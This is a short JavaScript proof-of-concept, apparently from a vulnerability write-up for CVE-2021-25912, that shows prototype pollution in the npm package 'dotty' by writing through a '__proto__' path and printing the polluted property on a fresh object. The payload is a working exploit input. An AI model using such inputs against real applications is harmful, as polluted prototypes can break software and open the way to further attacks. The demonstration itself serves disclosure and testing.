//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25912
  const dotty = require("dotty");
  console.log({}.polluted)
  dotty.put({}, "__proto__.polluted", "yes");
  console.log({}.polluted)

